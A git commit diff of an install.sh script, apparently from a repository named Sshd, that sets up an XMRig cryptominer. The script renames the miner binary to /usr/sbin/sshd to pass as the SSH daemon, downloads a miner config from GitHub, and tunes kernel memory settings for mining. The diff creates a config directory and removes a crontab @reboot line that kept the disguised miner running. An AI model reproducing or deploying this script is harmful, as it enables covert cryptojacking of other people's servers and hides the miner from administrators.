fc16043c3eae5654e23f3264cd42ed2474c2c5d8
Hackme258 <146896274+Hackme258@users.noreply.github.com>
2023-11-30 01:46:26 +0100

    Update install.sh

--- install.sh
+++ install.sh
@@ -16,6 +16,7 @@ mv /tmp/mx/minerd /usr/sbin/sshd
 
 #wget la config
 wget "https://github.com/Hackme258/Sshd/raw/main/xmrig.json"
+mkdir /root/.config
 sed -i 's/nom_machine/$nom/g' xmrig.json
 mv xmrig.json /root/.config/xmrig.json
 
@@ -24,8 +25,3 @@ rm -rf /tmp/mx
 echo 3 > /proc/sys/vm/drop_caches
 echo 1 > /proc/sys/vm/compact_memory
 echo always > /sys/kernel/mm/transparent_hugepage/enabled
-
-#crontab
-crontab -l > cron_bkp
-echo "@reboot /usr/sbin/sshd" >> cron_bkp
-crontab cron_bkp
